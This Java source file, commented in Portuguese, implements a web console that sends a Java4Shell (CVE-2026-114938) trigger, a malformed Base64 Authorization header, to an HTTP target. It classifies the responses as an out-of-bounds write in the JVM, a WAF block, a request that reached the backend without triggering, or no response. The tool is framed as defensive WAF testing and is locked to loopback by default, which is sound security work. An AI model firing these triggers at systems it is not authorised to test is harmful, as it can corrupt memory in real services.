// Detect4Shell — Console de Ataque (Java4Shell / CVE-2026-114938).
//
// Ferramenta DEFENSIVA de demonstração. Dispara o GATILHO Java4Shell (Base64 malformado longo
// terminando em '=') contra um alvo HTTP configurável — tipicamente um virtual server do FortiWeb
// que faz proxy para um alvo Java — e CLASSIFICA o resultado em 4 estados, mostrando tudo num
// frontend web:
//
//   ✅ OOB_SUCCESS     backend respondeu com a medição da escrita OOB (ataque chegou ao JVM e disparou)
//   🛡️ WAF_BLOCKED     o WAF (FortiWeb) barrou na borda (403 / página de bloqueio)
//   ⚠️ REACHED_NO_OOB  chegou ao backend mas NÃO disparou (JVM mitigada, CPU sem AVX-512 VBMI, ou patch)
//   ❓ NO_RESPONSE     sem resposta HTTP (conexão fechada / backend fora)
//
// NÃO é um exploit: o "payload" é só a string Base64 pública (A×64 + "="); nada é weaponizado.
// Use apenas contra sistemas que você está autorizado a testar.
//
// Trava de lab (higiene, não "segurança"): por padrão o console só dispara contra LOOPBACK
// (127.0.0.1 e todo o 127.0.0.0/8, localhost, ::1, *.localhost). Para apontar p/ QUALQUER outro
// host — só em rede isolada e com autorização — habilite explicitamente com a flag --allow-remote
// OU o env D4S_ALLOW_REMOTE=1. Sem o opt-in, um alvo não-loopback é RECUSADO antes de subir nada.
//
// Compilar/rodar (JDK 17+):
//   javac AttackConsole.java
//   java AttackConsole [alvo] [porta-ui] [--allow-remote]
//     alvo     default http://127.0.0.1:8899   (loopback; aponte p/ seu virtual server FortiWeb)
//     porta-ui default 8090                     (abra http://127.0.0.1:8090 no navegador)
//   ou defina o alvo por env:  D4S_TARGET=http://10.10.10.101:8899 java AttackConsole  (+ opt-in)
//   alvo remoto (opt-in):      D4S_ALLOW_REMOTE=1 java AttackConsole http://10.10.10.101:8899
//                          ou  java AttackConsole http://10.10.10.101:8899 --allow-remote

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AttackConsole {

    static String TARGET = System.getenv().getOrDefault("D4S_TARGET", "http://127.0.0.1:8899");
    static int PORT = 8090;

    static final HttpClient CLIENT = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(5))
            .version(HttpClient.Version.HTTP_1_1)
            .followRedirects(HttpClient.Redirect.NEVER)
            .build();

    public static void main(String[] args) throws Exception {
        // separa a flag --allow-remote dos argumentos posicionais [alvo] [porta-ui]
        boolean allowRemoteFlag = false;
        java.util.List<String> pos = new java.util.ArrayList<>();
        for (String a : args) {
            if (a == null) continue;
            if (a.trim().equals("--allow-remote")) allowRemoteFlag = true;
            else pos.add(a);
        }
        if (pos.size() >= 1 && !pos.get(0).isBlank()) TARGET = pos.get(0).trim();
        if (pos.size() >= 2) PORT = Integer.parseInt(pos.get(1).trim());

        // Trava de lab: alvo não-loopback exige opt-in EXPLÍCITO (--allow-remote ou D4S_ALLOW_REMOTE=1).
        boolean allowRemote = allowRemoteFlag || truthy(System.getenv("D4S_ALLOW_REMOTE"));
        if (!isLoopbackTarget(TARGET) && !allowRemote) {
            System.err.println("[AttackConsole] RECUSADO: alvo não-loopback \"" + TARGET + "\".");
            System.err.println("  Esta é uma ferramenta de LAB; por padrão ela só dispara contra loopback");
            System.err.println("  (127.0.0.1 / 127.0.0.0/8, localhost, ::1, *.localhost). Para apontar p/ outro");
            System.err.println("  host — só em rede isolada e com autorização — habilite o alvo remoto de forma");
            System.err.println("  explícita:");
            System.err.println("     java AttackConsole " + TARGET + " --allow-remote");
            System.err.println("     # ou");
            System.err.println("     D4S_ALLOW_REMOTE=1 java AttackConsole " + TARGET);
            System.exit(2);
            return;
        }

        HttpServer s = HttpServer.create(new InetSocketAddress(PORT), 0);
        s.createContext("/", ex -> {
            if (!"/".equals(ex.getRequestURI().getPath())) { send(ex, 404, "not found", "text/plain"); return; }
            send(ex, 200, PAGE.replace("__TARGET__", escHtml(TARGET)), "text/html; charset=utf-8");
        });
        s.createContext("/config", ex -> send(ex, 200, "{\"target\":\"" + escJson(TARGET) + "\"}", "application/json"));
        s.createContext("/logo.svg", ex -> send(ex, 200, LOGO_SVG, "image/svg+xml; charset=utf-8"));
        s.createContext("/bg.svg", ex -> send(ex, 200, BG_SVG, "image/svg+xml; charset=utf-8"));
        s.createContext("/fire", AttackConsole::fire);
        s.setExecutor(null);
        s.start();
        System.out.println("[AttackConsole] UI:  http://127.0.0.1:" + PORT);
        System.out.println("[AttackConsole] alvo: " + TARGET);
        if (!isLoopbackTarget(TARGET))
            System.out.println("[AttackConsole] alvo remoto HABILITADO via opt-in (--allow-remote / D4S_ALLOW_REMOTE=1).");
        System.out.println("[AttackConsole] Ctrl-C para sair.");
    }

    // -- cenários de payload (no header Authorization) --
    static String payload(String scenario) {
        switch (scenario == null ? "" : scenario) {
            case "benign":     return "dXNlcjpwYXNzd29yZA==";          // "user:password" — Base64 VÁLIDO curto, NÃO casa a assinatura
            case "trigger128": return repeat('A', 128) + "=";          // gatilho p/ JDK 17
            case "trigger":
            default:           return repeat('A', 64) + "=";           // gatilho p/ JDK 21/25/27
        }
    }

    static void fire(HttpExchange ex) throws IOException {
        String q = ex.getRequestURI().getRawQuery();
        String scenario = param(q, "scenario", "trigger");
        int n = 20;
        try { n = Math.max(1, Math.min(200, Integer.parseInt(param(q, "n", "20")))); } catch (Exception ignore) {}
        String b64 = payload(scenario);
        int oobHits = 0, blocked = 0, reached = 0, noResp = 0, maxOob = 0, lastCode = 0;
        String oobBody = "", blockBody = "", reachBody = "", err = null;
        long t0 = System.nanoTime();
        for (int i = 0; i < n; i++) {
            try {
                HttpRequest req = HttpRequest.newBuilder(URI.create(TARGET))
                        .timeout(Duration.ofSeconds(8))
                        .header("Authorization", "Basic " + b64)
                        .header("User-Agent", "Detect4Shell-AttackConsole/1.0 (defensivo)")
                        .GET().build();
                HttpResponse<String> resp = CLIENT.send(req, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
                int code = resp.statusCode();
                String body = resp.body() == null ? "" : resp.body();
                lastCode = code;
                String oob = firstGroup(body, "oob_write\\s*=\\s*(\\d+)");
                boolean waf = code == 403
                        || resp.headers().firstValue("X-FortiWeb").isPresent()
                        || containsAnyIgnoreCase(body, "FortiWeb", "Web Application Firewall",
                                                       "Detect4Shell", "trigger-shape", "block id", "attack id", "Bloqueado na borda");
                if (oob != null) { oobHits++; maxOob = Math.max(maxOob, Integer.parseInt(oob)); if (oobBody.isEmpty()) oobBody = body; }
                else if (waf) { blocked++; if (blockBody.isEmpty()) blockBody = body; }
                else { reached++; if (reachBody.isEmpty()) reachBody = body; }
            } catch (Exception e) {
                noResp++;
                err = e.getClass().getSimpleName() + (e.getMessage() != null ? ": " + e.getMessage() : "");
            }
        }
        long ms = (System.nanoTime() - t0) / 1_000_000;
        // estado dominante: OOB vence (basta 1); senão WAF se bloqueou a maioria; senão chegou-sem-OOB; senão sem-resposta
        String state, body;
        if (oobHits > 0)                            { state = "OOB_SUCCESS";    body = oobBody; }
        else if (blocked > 0 && blocked >= reached) { state = "WAF_BLOCKED";    body = blockBody; }
        else if (reached > 0)                       { state = "REACHED_NO_OOB"; body = reachBody; }
        else                                        { state = "NO_RESPONSE";    body = ""; }

        Map<String, Object> r = new LinkedHashMap<>();
        r.put("scenario", scenario);
        r.put("target", TARGET);
        r.put("shots", n);
        r.put("oobHits", oobHits);
        r.put("blocked", blocked);
        r.put("reached", reached);
        r.put("noResp", noResp);
        r.put("maxOob", maxOob);
        r.put("httpCode", lastCode);
        r.put("latencyMs", ms);
        r.put("state", state);
        r.put("sentHeader", "Authorization: Basic " + previewB64(b64));
        if (!body.isEmpty()) r.put("respSnippet", body.length() > 700 ? body.substring(0, 700) + "…" : body);
        if (err != null) r.put("error", err);
        send(ex, 200, toJson(r), "application/json");
    }

    // ---------- helpers ----------
    static String repeat(char c, int n) { char[] a = new char[n]; java.util.Arrays.fill(a, c); return new String(a); }
    static String previewB64(String b) { return b.length() > 40 ? b.substring(0, 40) + "…(" + b.length() + " chars)" : b; }

    // opt-in "verdadeiro": 1 / true / yes / on (case-insensitive). Qualquer outra coisa (ou null) = não.
    static boolean truthy(String v) {
        if (v == null) return false;
        String t = v.trim().toLowerCase(java.util.Locale.ROOT);
        return t.equals("1") || t.equals("true") || t.equals("yes") || t.equals("on");
    }

    // loopback = 127.0.0.0/8, ::1, localhost, *.localhost. Fail-closed: alvo não-parseável conta como remoto.
    static boolean isLoopbackTarget(String target) {
        String host;
        try { host = URI.create(target).getHost(); } catch (Exception e) { return false; }
        if (host == null) return false;              // autoridade não-"server-based" (ex.: host com '_') -> remoto
        host = host.trim();
        if (host.startsWith("[") && host.endsWith("]")) host = host.substring(1, host.length() - 1);  // [::1] -> ::1
        String h = host.toLowerCase(java.util.Locale.ROOT);
        if (h.equals("localhost") || h.endsWith(".localhost")) return true;
        if (h.equals("::1") || h.equals("0:0:0:0:0:0:0:1")) return true;
        return h.matches("127\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}");
    }

    static String param(String rawQuery, String key, String def) {
        if (rawQuery == null) return def;
        for (String kv : rawQuery.split("&")) {
            int i = kv.indexOf('=');
            if (i > 0 && kv.substring(0, i).equals(key)) {
                return java.net.URLDecoder.decode(kv.substring(i + 1), StandardCharsets.UTF_8);
            }
        }
        return def;
    }

    static String firstGroup(String s, String regex) {
        Matcher m = Pattern.compile(regex).matcher(s);
        return m.find() ? m.group(1) : null;
    }

    static boolean containsAnyIgnoreCase(String s, String... needles) {
        String low = s.toLowerCase();
        for (String n : needles) if (low.contains(n.toLowerCase())) return true;
        return false;
    }

    static void send(HttpExchange ex, int code, String body, String ctype) throws IOException {
        byte[] b = body.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", ctype);
        ex.getResponseHeaders().set("Cache-Control", "no-store");
        ex.sendResponseHeaders(code, b.length);
        try (OutputStream os = ex.getResponseBody()) { os.write(b); }
    }

    static String toJson(Map<String, Object> m) {
        StringBuilder sb = new StringBuilder("{");
        boolean first = true;
        for (Map.Entry<String, Object> e : m.entrySet()) {
            if (!first) sb.append(',');
            first = false;
            sb.append('"').append(escJson(e.getKey())).append("\":");
            Object v = e.getValue();
            if (v instanceof Number) sb.append(v.toString());
            else sb.append('"').append(escJson(String.valueOf(v))).append('"');
        }
        return sb.append('}').toString();
    }

    static String escJson(String s) {
        StringBuilder b = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"': b.append("\\\""); break;
                case '\\': b.append("\\\\"); break;
                case '\n': b.append("\\n"); break;
                case '\r': b.append("\\r"); break;
                case '\t': b.append("\\t"); break;
                default: if (c < 0x20) b.append(String.format("\\u%04x", (int) c)); else b.append(c);
            }
        }
        return b.toString();
    }

    static String escHtml(String s) {
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
    }

    // ---------- logo (gatinho Detect4Shell — docs/logo.svg, embutido p/ ser self-contained) ----------
    static final String LOGO_SVG = """
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1024" height="1024" viewBox="0 0 1024 1024" style="display: block" role="img" aria-label="Detect4Shell mascot">
<defs>
<pattern id="logo-wall" patternUnits="userSpaceOnUse" x="0" y="0" width="85.3333" height="102.4">
<text x="42.6667" y="77" text-anchor="middle" font-family="'JetBrains Mono', ui-monospace, Menlo, Consolas, monospace" font-size="72" font-weight="700" fill="#5b6b85">A</text>
</pattern>
<g id="logo-sil">
<polygon points="292,318 304,142 452,232"></polygon>
<polygon points="668,318 656,142 508,232"></polygon>
<ellipse cx="480" cy="715" rx="250" ry="215"></ellipse>
<ellipse cx="300" cy="915" rx="62" ry="34"></ellipse>
<ellipse cx="660" cy="915" rx="62" ry="34"></ellipse>
<ellipse cx="480" cy="400" rx="232" ry="196"></ellipse>
</g>
<clipPath id="logo-body">
<ellipse cx="480" cy="715" rx="250" ry="215"></ellipse>
</clipPath>
<clipPath id="logo-head">
<ellipse cx="480" cy="400" rx="232" ry="196"></ellipse>
</clipPath>
</defs>
<rect x="0" y="0" width="1024" height="1024" fill="#0b0e14"></rect>
<rect x="0" y="0" width="1024" height="1024" fill="url(#logo-wall)" opacity="0.24"></rect>
<g transform="translate(0 -33)">
<path d="M 265 850 C 150 880 90 790 150 700" fill="none" stroke="#f2efe6" stroke-width="84" stroke-linecap="round"></path>
<path d="M 265 850 C 150 880 90 790 150 700" fill="none" stroke="#a4a5a8" stroke-width="56" stroke-linecap="round"></path>
<path d="M 265 850 C 150 880 90 790 150 700" fill="none" stroke="#3a3b41" stroke-width="56" stroke-dasharray="15 38" stroke-dashoffset="-24"></path>
<use href="#logo-sil" fill="#f2efe6" stroke="#f2efe6" stroke-width="36" stroke-linejoin="round"></use>
<use href="#logo-sil" fill="#a4a5a8" stroke="#a4a5a8" stroke-width="8" stroke-linejoin="round"></use>
<g clip-path="url(#logo-body)">
<ellipse cx="480" cy="720" rx="132" ry="190" fill="#c9cacc"></ellipse>
<g fill="none" stroke="#3a3b41" stroke-width="15" stroke-linecap="round">
<path d="M 240 690 C 274 694 300 706 322 726"></path>
<path d="M 234 752 C 268 754 296 764 318 784"></path>
<path d="M 244 814 C 274 812 298 820 320 836"></path>
<path d="M 720 690 C 686 694 660 706 638 726"></path>
<path d="M 726 752 C 692 754 664 764 642 784"></path>
<path d="M 716 814 C 686 812 662 820 640 836"></path>
</g>
</g>
<ellipse cx="300" cy="915" rx="62" ry="34" fill="#e7e6e3" stroke="#e7e6e3" stroke-width="10"></ellipse>
<ellipse cx="660" cy="915" rx="62" ry="34" fill="#e7e6e3" stroke="#e7e6e3" stroke-width="10"></ellipse>
<g fill="none" stroke="#0b0e14" stroke-width="6" stroke-linecap="round">
<path d="M 285 906 L 285 926"></path>
<path d="M 315 906 L 315 926"></path>
<path d="M 645 906 L 645 926"></path>
<path d="M 675 906 L 675 926"></path>
</g>
<g fill="#76777c" stroke="#76777c" stroke-width="8" stroke-linejoin="round">
<polygon points="292,318 304,142 452,232"></polygon>
<polygon points="668,318 656,142 508,232"></polygon>
</g>
<ellipse cx="480" cy="400" rx="232" ry="196" fill="#a4a5a8" stroke="#a4a5a8" stroke-width="8"></ellipse>
<g clip-path="url(#logo-head)">
<path d="M 480 430 C 430 440 372 480 370 535 C 370 590 430 612 480 612 C 530 612 590 590 590 535 C 588 480 530 440 480 430 Z" fill="#e7e6e3"></path>
<g fill="none" stroke="#3a3b41" stroke-width="13" stroke-linecap="round">
<path d="M 480 226 L 480 296"></path>
<path d="M 446 230 C 446 255 450 280 456 300"></path>
<path d="M 514 230 C 514 255 510 280 504 300"></path>
<path d="M 410 244 C 412 265 420 285 432 302"></path>
<path d="M 550 244 C 548 265 540 285 528 302"></path>
<path d="M 336 410 C 312 402 290 402 262 410"></path>
<path d="M 336 440 C 314 436 294 438 268 448"></path>
<path d="M 624 410 C 648 402 670 402 698 410"></path>
<path d="M 624 440 C 646 436 666 438 692 448"></path>
</g>
</g>
<g fill="#d3a99c" stroke="#d3a99c" stroke-width="8" stroke-linejoin="round">
<polygon points="326,262 328,192 398,236"></polygon>
<polygon points="634,262 632,192 562,236"></polygon>
</g>
<path d="M 330 548 A 232 196 0 0 0 630 548" fill="none" stroke="#0b0e14" stroke-width="10" stroke-linecap="round"></path>
<g fill="none" stroke="#f2efe6" stroke-width="7" stroke-linecap="round">
<path d="M 318 470 L 205 448"></path>
<path d="M 318 500 L 200 508"></path>
<path d="M 642 470 L 755 448"></path>
<path d="M 642 500 L 760 508"></path>
</g>
<g fill="#3a3b41">
<circle cx="410" cy="505" r="5"></circle>
<circle cx="424" cy="522" r="5"></circle>
<circle cx="404" cy="527" r="5"></circle>
<circle cx="550" cy="505" r="5"></circle>
<circle cx="536" cy="522" r="5"></circle>
<circle cx="556" cy="527" r="5"></circle>
</g>
<ellipse cx="388" cy="392" rx="46" ry="52" fill="#8fc1ea" stroke="#0b0e14" stroke-width="10"></ellipse>
<ellipse cx="572" cy="392" rx="46" ry="52" fill="#8fc1ea" stroke="#0b0e14" stroke-width="10"></ellipse>
<ellipse cx="388" cy="394" rx="19" ry="34" fill="#0b0e14"></ellipse>
<ellipse cx="572" cy="394" rx="19" ry="34" fill="#0b0e14"></ellipse>
<circle cx="374" cy="372" r="11" fill="#f2efe6"></circle>
<circle cx="558" cy="372" r="11" fill="#f2efe6"></circle>
<path d="M 462 462 L 498 462 L 480 484 Z" fill="#d08b7c" stroke="#0b0e14" stroke-width="7" stroke-linejoin="round"></path>
<path d="M 480 490 L 480 504" fill="none" stroke="#0b0e14" stroke-width="8" stroke-linecap="round"></path>
<ellipse cx="480" cy="532" rx="36" ry="32" fill="#0b0e14"></ellipse>
<ellipse cx="480" cy="546" rx="21" ry="12" fill="#d08b7c"></ellipse>
<path d="M 480 636 L 606 676 L 606 790 C 606 880 540 930 480 960 C 420 930 354 880 354 790 L 354 676 Z" fill="#0b0e14" stroke="#0b0e14" stroke-width="34" stroke-linejoin="round"></path>
<path d="M 480 636 L 606 676 L 606 790 C 606 880 540 930 480 960 C 420 930 354 880 354 790 L 354 676 Z" fill="#8fe388" stroke="#8fe388" stroke-width="10" stroke-linejoin="round"></path>
<path d="M 428 806 L 466 846 L 536 758" fill="none" stroke="#0b0e14" stroke-width="26" stroke-linecap="round" stroke-linejoin="round"></path>
<ellipse cx="412" cy="668" rx="46" ry="34" fill="#e7e6e3" stroke="#0b0e14" stroke-width="9"></ellipse>
<ellipse cx="548" cy="668" rx="46" ry="34" fill="#e7e6e3" stroke="#0b0e14" stroke-width="9"></ellipse>
<g fill="none" stroke="#0b0e14" stroke-width="6" stroke-linecap="round">
<path d="M 398 664 L 398 686"></path>
<path d="M 426 664 L 426 686"></path>
<path d="M 534 664 L 534 686"></path>
<path d="M 562 664 L 562 686"></path>
</g>
<g transform="rotate(-8 856 345)" fill="#ff5c57">
<rect x="790" y="296" width="132" height="38" rx="19"></rect>
<rect x="790" y="356" width="132" height="38" rx="19"></rect>
</g>
</g>
</svg>
""";

    // fundo (watermark): o MESMO gatinho sem o retangulo escuro (transparente) e com a parede de "A"
    // trocada por 0s e 1s -- servido em /bg.svg e aplicado como marca d'agua faint do console.
    static final String BG_SVG = LOGO_SVG
        .replace("<rect x=\"0\" y=\"0\" width=\"1024\" height=\"1024\" fill=\"#0b0e14\"></rect>", "")
        .replace("<text x=\"42.6667\" y=\"77\" text-anchor=\"middle\" font-family=\"'JetBrains Mono', ui-monospace, Menlo, Consolas, monospace\" font-size=\"72\" font-weight=\"700\" fill=\"#5b6b85\">A</text>",
                 "<text x=\"16\" y=\"58\" font-family=\"'JetBrains Mono',ui-monospace,Consolas,monospace\" font-size=\"50\" font-weight=\"700\" fill=\"#5b6b85\">0</text><text x=\"54\" y=\"96\" font-family=\"'JetBrains Mono',ui-monospace,Consolas,monospace\" font-size=\"50\" font-weight=\"700\" fill=\"#5b6b85\">1</text>")
        .replace("fill=\"url(#logo-wall)\" opacity=\"0.24\"", "fill=\"url(#logo-wall)\" opacity=\"0.6\"");

    // ---------- frontend ----------
    static final String PAGE = """
<!doctype html><html lang="pt-br"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Detect4Shell — Console de Ataque</title>
<style>
  :root{--bg:#0b0f17;--panel:#121826;--line:#1e2838;--txt:#e6edf6;--mut:#8b9bb4;
        --ok:#1f9d55;--okbg:#0e2a1b;--block:#2f6fed;--blockbg:#0e1c3a;
        --warn:#c98a12;--warnbg:#2a1f0c;--none:#55617a;--nonebg:#161b26;--red:#e01e2b;}
  *{box-sizing:border-box} html{background:var(--bg)} body{margin:0;background:transparent;color:var(--txt);
     font:15px/1.5 system-ui,Segoe UI,Roboto,Arial} a{color:#6ea8fe}
  body::before{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;
     background:url(/bg.svg) no-repeat center 44% / min(880px,96vw);opacity:.07}
  header{display:flex;align-items:center;gap:12px;padding:16px 22px;border-bottom:1px solid var(--line);background:#0d1220}
  header .logo{width:42px;height:42px;border-radius:10px;display:block;border:1px solid var(--line)}
  header h1{font-size:17px;margin:0} header .cve{color:var(--mut);font-size:12px}
  .wrap{max-width:980px;margin:22px auto;padding:0 18px}
  .target{color:var(--mut);font-size:13px;margin-bottom:16px}
  .target code{color:#9fd0ff;background:#0e1626;padding:2px 7px;border-radius:5px;border:1px solid var(--line)}
  .row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:16px}
  .seg{display:flex;border:1px solid var(--line);border-radius:9px;overflow:hidden}
  .seg button{background:var(--panel);color:var(--txt);border:0;padding:9px 14px;cursor:pointer;font-size:13px;border-right:1px solid var(--line)}
  .seg button:last-child{border-right:0} .seg button.on{background:#1b2740;color:#cfe0ff;box-shadow:inset 0 -2px 0 var(--block)}
  .fire{margin-left:auto;background:var(--red);color:#fff;border:0;border-radius:9px;padding:11px 20px;font-weight:700;font-size:15px;cursor:pointer}
  .fire:disabled{opacity:.6;cursor:default}
  .card{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:0;overflow:hidden;margin-bottom:16px}
  .badge{padding:18px 20px;display:flex;align-items:center;gap:14px;font-size:19px;font-weight:800}
  .badge .ico{font-size:26px}
  .badge small{display:block;font-size:12px;font-weight:500;opacity:.9;margin-top:2px}
  .S_OOB_SUCCESS{background:var(--okbg);color:#7ee2a8;border-bottom:1px solid #194b30}
  .S_WAF_BLOCKED{background:var(--blockbg);color:#9ec2ff;border-bottom:1px solid #1b336b}
  .S_REACHED_NO_OOB{background:var(--warnbg);color:#f0c674;border-bottom:1px solid #4a3a12}
  .S_NO_RESPONSE,.S_ERROR{background:var(--nonebg);color:#aeb7c7;border-bottom:1px solid var(--line)}
  .S_IDLE{background:#0e1422;color:var(--mut)}
  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:1px;background:var(--line)}
  .grid div{background:var(--panel);padding:10px 14px} .grid .k{color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:.04em}
  .grid .v{font-size:15px;margin-top:2px;word-break:break-word} .mono{font-family:ui-monospace,Consolas,monospace}
  pre{margin:0;padding:12px 14px;background:#0a0e18;border-top:1px solid var(--line);color:#b9c6da;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:220px;overflow:auto}
  h3{color:var(--mut);font-size:12px;text-transform:uppercase;letter-spacing:.05em;margin:22px 0 8px}
  .hist{border:1px solid var(--line);border-radius:10px;overflow:hidden}
  .hist .h{display:flex;gap:12px;align-items:center;padding:9px 14px;border-top:1px solid var(--line);font-size:13px}
  .hist .h:first-child{border-top:0} .dot{width:9px;height:9px;border-radius:50%;flex:none}
  .legend{color:var(--mut);font-size:12px;margin-top:14px;line-height:1.7}
</style></head><body>
<header>
  <img class="logo" src="/logo.svg" alt="Detect4Shell">
  <div><h1>Detect4Shell · Console de Ataque</h1>
  <div class="cve">Java4Shell — CVE-2026-114938 · ferramenta defensiva de demonstração</div></div>
</header>
<div class="wrap">
  <div class="target">Alvo: <code>__TARGET__</code> &nbsp;→&nbsp; (FortiWeb vserver → backend Java)</div>
  <div class="row">
    <div class="seg" id="seg">
      <button data-s="benign">Benigno (controle)</button>
      <button data-s="trigger" class="on">Gatilho A×64 =</button>
      <button data-s="trigger128">Gatilho A×128 = (JDK 17)</button>
    </div>
    <button class="fire" id="fire">⚡ DISPARAR ATAQUE</button>
  </div>

  <div class="card">
    <div class="badge S_IDLE" id="badge"><span class="ico">⏱️</span><div>Pronto<small>escolha um cenário e dispare</small></div></div>
    <div class="grid" id="grid"></div>
    <pre id="resp" style="display:none"></pre>
  </div>

  <h3>Histórico</h3>
  <div class="hist" id="hist"></div>

  <div class="legend">
    ✅ <b>OOB_SUCCESS</b> — chegou ao JVM e disparou a escrita OOB (ataque bem-sucedido).&nbsp;
    🛡️ <b>WAF_BLOCKED</b> — barrado na borda pelo FortiWeb (403).&nbsp;
    ⚠️ <b>REACHED_NO_OOB</b> — chegou ao backend mas não disparou (JVM mitigada / CPU sem VBMI / patch).&nbsp;
    ❓ <b>NO_RESPONSE</b> — sem resposta HTTP (backend fora / conexão fechada).
  </div>
</div>
<script>
const META={
  OOB_SUCCESS:{c:'S_OOB_SUCCESS',i:'✅',t:'ATAQUE BEM-SUCEDIDO',dot:'#1f9d55'},
  WAF_BLOCKED:{c:'S_WAF_BLOCKED',i:'🛡️',t:'BLOQUEADO PELO WAF',dot:'#2f6fed'},
  REACHED_NO_OOB:{c:'S_REACHED_NO_OOB',i:'⚠️',t:'CHEGOU AO BACKEND, SEM OOB',dot:'#c98a12'},
  NO_RESPONSE:{c:'S_NO_RESPONSE',i:'❓',t:'SEM RESPOSTA',dot:'#55617a'},
  ERROR:{c:'S_ERROR',i:'⛔',t:'ERRO',dot:'#55617a'}};
let scen='trigger';
document.querySelectorAll('#seg button').forEach(b=>b.onclick=()=>{
  scen=b.dataset.s;document.querySelectorAll('#seg button').forEach(x=>x.classList.remove('on'));b.classList.add('on');});
const badge=document.getElementById('badge'),grid=document.getElementById('grid'),
      resp=document.getElementById('resp'),hist=document.getElementById('hist'),fire=document.getElementById('fire');
function cell(k,v){return `<div><div class="k">${k}</div><div class="v mono">${v??'—'}</div></div>`}
fire.onclick=async()=>{
  fire.disabled=true;badge.className='badge S_IDLE';badge.innerHTML='<span class="ico">⏳</span><div>Disparando rajada…<small>'+scen+'</small></div>';
  grid.innerHTML='';resp.style.display='none';
  try{
    const r=await fetch('/fire?scenario='+encodeURIComponent(scen));const d=await r.json();
    const m=META[d.state]||META.ERROR;
    let sub=d.state==='OOB_SUCCESS'?('OOB disparou em '+d.oobHits+'/'+d.shots+' tentativas · '+d.maxOob+' bytes no JVM')
           :d.state==='WAF_BLOCKED'?('FortiWeb barrou '+d.blocked+'/'+d.shots+' na borda (HTTP 403)')
           :d.state==='REACHED_NO_OOB'?(d.reached+'/'+d.shots+' chegaram ao backend · 0 OOB (imune/mitigado)')
           :d.state==='NO_RESPONSE'?(((d.noResp||d.shots))+'/'+d.shots+' sem resposta'+(d.error?' · '+d.error:'')):'';
    badge.className='badge '+m.c;
    badge.innerHTML='<span class="ico">'+m.i+'</span><div>'+m.t+'<small>'+sub+'</small></div>';
    grid.innerHTML=cell('Cenário',d.scenario)+cell('Disparos',d.shots)
      +cell('OOB',d.oobHits+'/'+d.shots+(d.maxOob?' · '+d.maxOob+'B':''))
      +cell('Bloqueados (403)',d.blocked+'/'+d.shots)
      +cell('Latência',(d.latencyMs!=null?d.latencyMs+' ms':'—'))+cell('Header',d.sentHeader);
    if(d.respSnippet){resp.style.display='block';resp.textContent=d.respSnippet;}
    const t=new Date().toLocaleTimeString();
    hist.insertAdjacentHTML('afterbegin',
      '<div class="h"><span class="dot" style="background:'+m.dot+'"></span>'
      +'<b>'+m.t+'</b><span style="color:#8b9bb4">'+d.scenario+' · OOB '+d.oobHits+'/'+d.shots+' · bloq '+d.blocked+'/'+d.shots+'</span>'
      +'<span style="margin-left:auto;color:#8b9bb4">'+t+'</span></div>');
  }catch(e){badge.className='badge S_ERROR';badge.innerHTML='<span class="ico">⛔</span><div>ERRO<small>'+e+'</small></div>';}
  fire.disabled=false;
};
</script></body></html>
""";
}
